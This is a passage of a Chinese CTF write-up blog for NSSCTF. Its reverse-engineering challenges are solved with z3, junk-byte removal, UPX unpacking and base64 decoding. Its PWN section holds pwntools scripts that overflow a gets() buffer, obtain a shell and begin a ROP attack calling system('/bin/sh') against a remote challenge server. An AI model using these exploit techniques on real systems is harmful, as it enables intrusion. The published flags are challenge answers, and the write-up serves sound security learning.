* v18 + <span class="number">1494</span> * v17 + <span class="number">2353</span> * v16 + <span class="number">235</span> * v15 + <span class="number">3843</span> * v14 + <span class="number">1496</span> * v13 + <span class="number">1302</span> * v19 != <span class="number">1206735</span></span><br><span class="line">      || <span class="number">101</span> * v18 + <span class="number">2025</span> * v17 + <span class="number">2842</span> * v16 + <span class="number">1559</span> * v15 + <span class="number">2143</span> * v14 + <span class="number">3008</span> * v13 + <span class="number">981</span> * v19 != <span class="number">1306983</span></span><br><span class="line">      || <span class="number">1290</span> * v18 + <span class="number">3822</span> * v17 + <span class="number">1733</span> * v16 + <span class="number">292</span> * v15 + <span class="number">816</span> * v14 + <span class="number">1017</span> * v13 + <span class="number">3199</span> * v19 != <span class="number">1160573</span></span><br><span class="line">      || (result = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">186</span> * v18 + <span class="number">2712</span> * v17 + <span class="number">2136</span> * v16 + <span class="number">98</span> * v13 + <span class="number">138</span> * v14 + <span class="number">3584</span> * v15 + <span class="number">1173</span> * v19),</span><br><span class="line">          (_DWORD)result != <span class="number">1005746</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z3解方程</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">22</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    flag[i] = z3.Int(<span class="string">&quot;flag[%d]&quot;</span>%i)</span><br><span class="line">S=Solver()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">S.add(<span class="number">3201</span>*flag[<span class="number">0</span>]+<span class="number">2051</span>*flag[<span class="number">1</span>]+<span class="number">3541</span>*flag[<span class="number">2</span>]+<span class="number">395</span>*flag[<span class="number">3</span>]+<span class="number">245</span>*flag[<span class="number">4</span>]+<span class="number">1345</span>*flag[<span class="number">5</span>]==<span class="number">855009</span>,</span><br><span class="line"><span class="number">1546</span>*flag[<span class="number">0</span>]+<span class="number">3963</span>*flag[<span class="number">1</span>]+<span class="number">3900</span>*flag[<span class="number">2</span>]+<span class="number">3759</span>*flag[<span class="number">3</span>]+<span class="number">3270</span>*flag[<span class="number">4</span>]+<span class="number">3082</span>*flag[<span class="number">5</span>]==<span class="number">1515490</span>,</span><br><span class="line"><span class="number">2012</span>*flag[<span class="number">0</span>]+<span class="number">2458</span>*flag[<span class="number">1</span>]+<span class="number">3349</span>*flag[<span class="number">2</span>]+<span class="number">2283</span>*flag[<span class="number">3</span>]+<span class="number">526</span>*flag[<span class="number">4</span>]+<span class="number">268</span>*flag[<span class="number">5</span>]==<span class="number">854822</span>,</span><br><span class="line"><span class="number">2569</span>*flag[<span class="number">0</span>]+<span class="number">1571</span>*flag[<span class="number">1</span>]+<span class="number">3146</span>*flag[<span class="number">2</span>]+<span class="number">2021</span>*flag[<span class="number">3</span>]+<span class="number">3208</span>*flag[<span class="number">4</span>]+<span class="number">1395</span>*flag[<span class="number">5</span>]==<span class="number">1094422</span>,</span><br><span class="line"><span class="number">1575</span>*flag[<span class="number">0</span>]+<span class="number">1824</span>*flag[<span class="number">1</span>]+<span class="number">2997</span>*flag[<span class="number">2</span>]+<span class="number">3553</span>*flag[<span class="number">3</span>]+<span class="number">3136</span>*flag[<span class="number">4</span>]+<span class="number">1599</span>*flag[<span class="number">5</span>]==<span class="number">1136398</span>,</span><br><span class="line"><span class="number">2908</span>*flag[<span class="number">0</span>]+<span class="number">3672</span>*flag[<span class="number">1</span>]+<span class="number">86</span>*flag[<span class="number">2</span>]+<span class="number">1349</span>*flag[<span class="number">3</span>]+<span class="number">2300</span>*flag[<span class="number">4</span>]+<span class="number">1681</span>*flag[<span class="number">5</span>]==<span class="number">939991</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">202</span>+flag[<span class="number">7</span>]*<span class="number">56</span>+flag[<span class="number">8</span>]*<span class="number">485</span>+flag[<span class="number">9</span>]*<span class="number">325</span>+flag[<span class="number">10</span>]*<span class="number">490</span>+flag[<span class="number">18</span>]*<span class="number">342</span>+flag[<span class="number">19</span>]*<span class="number">153</span>+flag[<span class="number">20</span>]*<span class="number">212</span>+flag[<span class="number">21</span>]*<span class="number">191</span>==<span class="number">245940</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">207</span>+flag[<span class="number">7</span>]*<span class="number">460</span>+flag[<span class="number">8</span>]*<span class="number">22</span>+flag[<span class="number">9</span>]*<span class="number">24</span>+flag[<span class="number">10</span>]*<span class="number">153</span>+flag[<span class="number">18</span>]*<span class="number">134</span>+flag[<span class="number">19</span>]*<span class="number">185</span>+flag[<span class="number">20</span>]*<span class="number">348</span>+flag[<span class="number">21</span>]*<span class="number">22</span>==<span class="number">146392</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">154</span>+flag[<span class="number">7</span>]*<span class="number">164</span>+flag[<span class="number">8</span>]*<span class="number">311</span>+flag[<span class="number">9</span>]*<span class="number">433</span>+flag[<span class="number">10</span>]*<span class="number">339</span>+flag[<span class="number">18</span>]*<span class="number">489</span>+flag[<span class="number">19</span>]*<span class="number">231</span>+flag[<span class="number">20</span>]*<span class="number">177</span>+flag[<span class="number">21</span>]*<span class="number">100</span>==<span class="number">239438</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">360</span>+flag[<span class="number">7</span>]*<span class="number">270</span>+flag[<span class="number">8</span>]*<span class="number">22</span>+flag[<span class="number">9</span>]*<span class="number">470</span>+flag[<span class="number">10</span>]*<span class="number">466</span>+flag[<span class="number">18</span>]*<span class="number">68</span>+flag[<span class="number">19</span>]*<span class="number">337</span>+flag[<span class="number">20</span>]*<span class="number">257</span>+flag[<span class="number">21</span>]*<span class="number">82</span>==<span class="number">233887</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">197</span>+flag[<span class="number">7</span>]*<span class="number">92</span>+flag[<span class="number">8</span>]*<span class="number">73</span>+flag[<span class="number">9</span>]*<span class="number">151</span>+flag[<span class="number">10</span>]*<span class="number">91</span>+flag[<span class="number">18</span>]*<span class="number">468</span>+flag[<span class="number">19</span>]*<span class="number">235</span>+flag[<span class="number">20</span>]*<span class="number">246</span>+flag[<span class="number">21</span>]*<span class="number">54</span>==<span class="number">152663</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">242</span>+flag[<span class="number">7</span>]*<span class="number">376</span>+flag[<span class="number">8</span>]*<span class="number">55</span>+flag[<span class="number">9</span>]*<span class="number">233</span>+flag[<span class="number">10</span>]*<span class="number">243</span>+flag[<span class="number">18</span>]*<span class="number">131</span>+flag[<span class="number">19</span>]*<span class="number">377</span>+flag[<span class="number">20</span>]*<span class="number">241</span>+flag[<span class="number">21</span>]*<span class="number">343</span>==<span class="number">228375</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">364</span>+flag[<span class="number">7</span>]*<span class="number">284</span>+flag[<span class="number">8</span>]*<span class="number">301</span>+flag[<span class="number">9</span>]*<span class="number">136</span>+flag[<span class="number">10</span>]*<span class="number">458</span>+flag[<span class="number">18</span>]*<span class="number">5</span>+flag[<span class="number">19</span>]*<span class="number">200</span>+flag[<span class="number">20</span>]*<span class="number">356</span>+flag[<span class="number">21</span>]*<span class="number">61</span>==<span class="number">211183</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">66</span>+flag[<span class="number">7</span>]*<span class="number">71</span>+flag[<span class="number">8</span>]*<span class="number">80</span>+flag[<span class="number">9</span>]*<span class="number">17</span>+flag[<span class="number">10</span>]*<span class="number">107</span>+flag[<span class="number">18</span>]*<span class="number">406</span>+flag[<span class="number">19</span>]*<span class="number">55</span>+flag[<span class="number">20</span>]*<span class="number">154</span>+flag[<span class="number">21</span>]*<span class="number">71</span>==<span class="number">96788</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">56</span>+flag[<span class="number">7</span>]*<span class="number">409</span>+flag[<span class="number">8</span>]*<span class="number">280</span>+flag[<span class="number">9</span>]*<span class="number">197</span>+flag[<span class="number">10</span>]*<span class="number">494</span>+flag[<span class="number">18</span>]*<span class="number">63</span>+flag[<span class="number">19</span>]*<span class="number">201</span>+flag[<span class="number">20</span>]*<span class="number">335</span>+flag[<span class="number">21</span>]*<span class="number">99</span>==<span class="number">204625</span>,</span><br><span class="line"><span class="number">81</span>*flag[<span class="number">11</span>]+<span class="number">3001</span>*flag[<span class="number">12</span>]+<span class="number">1967</span>*flag[<span class="number">13</span>]+<span class="number">1326</span>*flag[<span class="number">14</span>]+<span class="number">1266</span>*flag[<span class="number">15</span>]+<span class="number">428</span>*flag[<span class="number">16</span>]+<span class="number">2439</span>*flag[<span class="number">17</span>]==<span class="number">1109296</span>,</span><br><span class="line"><span class="number">164</span>*flag[<span class="number">11</span>]+<span class="number">3073</span>*flag[<span class="number">12</span>]+<span class="number">2539</span>*flag[<span class="number">13</span>]+<span class="number">141</span>*flag[<span class="number">14</span>]+<span class="number">4027</span>*flag[<span class="number">15</span>]+<span class="number">2585</span>*flag[<span class="number">16</span>]+<span class="number">1556</span>*flag[<span class="number">17</span>]==<span class="number">1368547</span>,</span><br><span class="line"><span class="number">2197</span>*flag[<span class="number">11</span>]+<span class="number">3681</span>*flag[<span class="number">12</span>]+<span class="number">1341</span>*flag[<span class="number">13</span>]+<span class="number">1317</span>*flag[<span class="number">14</span>]+<span class="number">358</span>*flag[<span class="number">15</span>]+<span class="number">2080</span>*flag[<span class="number">16</span>]+<span class="number">1205</span>*flag[<span class="number">17</span>]==<span class="number">1320274</span>,</span><br><span class="line"><span class="number">1496</span>*flag[<span class="number">11</span>]+<span class="number">3843</span>*flag[<span class="number">12</span>]+<span class="number">235</span>*flag[<span class="number">13</span>]+<span class="number">2353</span>*flag[<span class="number">14</span>]+<span class="number">1494</span>*flag[<span class="number">15</span>]+<span class="number">840</span>*flag[<span class="number">16</span>]+<span class="number">1302</span>*flag[<span class="number">17</span>]==<span class="number">1206735</span>,</span><br><span class="line"><span class="number">3008</span>*flag[<span class="number">11</span>]+<span class="number">2143</span>*flag[<span class="number">12</span>]+<span class="number">1559</span>*flag[<span class="number">13</span>]+<span class="number">2842</span>*flag[<span class="number">14</span>]+<span class="number">2025</span>*flag[<span class="number">15</span>]+<span class="number">101</span>*flag[<span class="number">16</span>]+<span class="number">981</span>*flag[<span class="number">17</span>]==<span class="number">1306983</span>,</span><br><span class="line"><span class="number">1017</span>*flag[<span class="number">11</span>]+<span class="number">816</span>*flag[<span class="number">12</span>]+<span class="number">292</span>*flag[<span class="number">13</span>]+<span class="number">1733</span>*flag[<span class="number">14</span>]+<span class="number">3822</span>*flag[<span class="number">15</span>]+<span class="number">1290</span>*flag[<span class="number">16</span>]+<span class="number">3199</span>*flag[<span class="number">17</span>]==<span class="number">1160573</span>,</span><br><span class="line"><span class="number">98</span>*flag[<span class="number">11</span>]+<span class="number">138</span>*flag[<span class="number">12</span>]+<span class="number">3584</span>*flag[<span class="number">13</span>]+<span class="number">2136</span>*flag[<span class="number">14</span>]+<span class="number">2712</span>*flag[<span class="number">15</span>]+<span class="number">186</span>*flag[<span class="number">16</span>]+<span class="number">1173</span>*flag[<span class="number">17</span>]==<span class="number">1005746</span>)</span><br><span class="line">S.check()</span><br><span class="line">t = S.model()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    <span class="keyword">try</span>:<span class="built_in">print</span>(t[flag[i]],end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">sb = [<span class="number">78</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">64</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">95</span>,<span class="number">90</span>,<span class="number">51</span>,<span class="number">125</span>,]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sb:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>NSSCTF{pip_inst@ll_Z3}</p><h3 id="e-sy-flower"><a href="#e-sy-flower" class="headerlink" title="e@sy_flower"></a>e@sy_flower</h3><p>很明显的花指令。</p><p><img src="https://s2.loli.net/2023/08/04/7ncxlk18AupzWwF.png" alt="image-20221023100120874.png"></p><p>一般来说，汇编语言的跳转应该是直接是一个地址，而不会出现+1这种情况，出现这种情况一般是由脏字导致，于是我们把爆红的地方按快捷键u转化为数据，可以看到，D4处是垃圾数据，正常的函数应该是从unk_401D5处开始的，而由于脏字的加入导致反编译失败。</p><p><img src="https://s2.loli.net/2023/08/04/HW5hTlBycGvbi4s.png" alt="image-20221023101053945.png"></p><p>按快捷键c把unk_401D5后的数据转化成代码，同时把垃圾数据nop掉即可，把错误的地方按p重新识别为函数。</p><p><img src="https://s2.loli.net/2023/08/04/8OqfcXL5s2axKlb.png" alt="image-20221023100609377.png"></p><p>主函数编译出来了。加密逻辑就是输入数据的<code>v[2*i-1]</code>和<code>v[2*i]</code>交换后和0x30异或。</p><p><img src="https://s2.loli.net/2023/08/04/pM67YJPsmwUL8Ze.png" alt="image-20221023102052453.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">0x63</span>, <span class="number">0x7E</span>, <span class="number">0x73</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>, <span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, </span><br><span class="line">      <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5E</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, </span><br><span class="line">      <span class="number">0x43</span>, <span class="number">0x55</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, (<span class="built_in">len</span>(<span class="built_in">str</span>)+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">    temp = <span class="built_in">str</span>[<span class="number">2</span>*i]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">2</span>*i] = <span class="built_in">str</span>[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">2</span>*i+<span class="number">1</span>] = temp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">str</span>[i] ^ <span class="number">0x30</span></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{Just_junk_Bytess}</p><h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><h3 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h3><p>查壳后发现程序加壳了，是upx3.96。脱壳即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">160</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">128</span>]; <span class="comment">// [rsp+C0h] [rbp+40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">do_something</span>(Str2, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(enc, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5与str2经过do_something加密后为密文enc</p><p><img src="https://s2.loli.net/2023/08/04/1nLSWzQ7lTeuOv4.png" alt="image-20221021105716955.png"></p><p>很明显的换表base64加密。</p><p>密文enc=’tLntq1rgE1vqwf8XC19Zmf8Zyxn5Fq==’那么经过换表base64解迷2就是flag了。</p><p>NSSCTF{UPX_1s_s0_3asy}</p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>提示要点99999999下才能拿到flag，ce找基址然后改内存即可。</p><p><img src="https://s2.loli.net/2023/08/04/qungbR1waKZBMzQ.png" alt="image-20221021110552499.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Week1-1"><a href="#Week1-1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>Source</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input something&quot;</span>);</span><br><span class="line">    <span class="type">char</span> name[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> number=<span class="number">0</span>;</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="keyword">if</span>(number!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You win.&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets存在栈溢出，gdb一下，可以看到cmp是拿[rbp - 4]即0x8c的值和0进行比较，那么可以推断出number的值就是存在这个地址里，栈顶rsp为0x60距离0x8c有0x2c个单位，那么就要存入0x2d个1就能覆盖number的值。就拿到flag了。</p><p><img src="https://s2.loli.net/2023/08/04/kEYbJ58wLDK2Pe1.png" alt="image-20221014112957850.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">sh = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28048</span>)</span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x2d</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ezcmp</p><p>给源文件了，基本逻辑就是buff经过enccrypto加密。我们输入密文就能得到shell。</p><p><img src="https://s2.loli.net/2023/08/04/Es45f62SiXdo1Cw.png" alt="image-20221027104049616.png"></p><p>源文件已经给我们了，直接写脚本即可，注意要&amp;0xff得到byte形式的密文（有不可见字符），要不然打不通。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> v0;</span><br><span class="line"><span class="type">char</span> buffff[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234&quot;</span>;</span><br><span class="line"><span class="type">char</span> bua[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz4321&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">enccrypt</span><span class="params">(<span class="type">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a = <span class="built_in">rand</span>();</span><br><span class="line">        buf[i] ^= buffff[i];</span><br><span class="line">        buff[i] ^= bua[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            buf[j] = buff[i];</span><br><span class="line">            buf[i] += <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buf[i] -= ((bua[i] ^ <span class="number">0x30</span>) * (buffff[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">        buf[i] += (a % buff[i]) &amp; <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[] = <span class="string">&quot;Ayaka_nbbbbbbbbbbbbbbbbb_pluss&quot;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buff, buf);</span><br><span class="line">    <span class="type">char</span> test[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> v0 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">srand</span>(v0);</span><br><span class="line">    <span class="built_in">enccrypt</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, buff[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>windows和linux平台跑出来的结果不一样，用gcc编译。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28967</span>)</span><br><span class="line">playload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">0x72</span>,<span class="number">0x40</span>,<span class="number">0xe</span>,<span class="number">0xdc</span>,<span class="number">0xaa</span>,<span class="number">0x78</span>,<span class="number">0x46</span>,<span class="number">0x14</span>,<span class="number">0xe2</span>,<span class="number">0xb0</span>,<span class="number">0x7e</span>,<span class="number">0x4c</span>,<span class="number">0x1a</span>,<span class="number">0xe8</span>,<span class="number">0xb6</span>,<span class="number">0x84</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,<span class="number">0xee</span>,<span class="number">0xbc</span>,<span class="number">0x8a</span>,<span class="number">0x58</span>,<span class="number">0x26</span>,<span class="number">0xf4</span>,<span class="number">0xc2</span>,<span class="number">0x90</span>,<span class="number">0x5e</span>,<span class="number">0x2c</span>,<span class="number">0xcb</span>,<span class="number">0xc8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    playload += <span class="built_in">chr</span>(i)</span><br><span class="line">p.sendline(playload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ezr0p32"><a href="#ezr0p32" class="headerlink" title="ezr0p32"></a>ezr0p32</h3><p><img src="https://s2.loli.net/2023/08/04/jLfoiKIrWtnyAgp.png" alt="image-20221027104820709.png"></p><p>有两个read函数，rop32不需要泄露libc地址，system函数在题中已经给出，我们在第一个read写入/bin/sh即可。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28131</span>)</span><br><span class="line">system_addr = 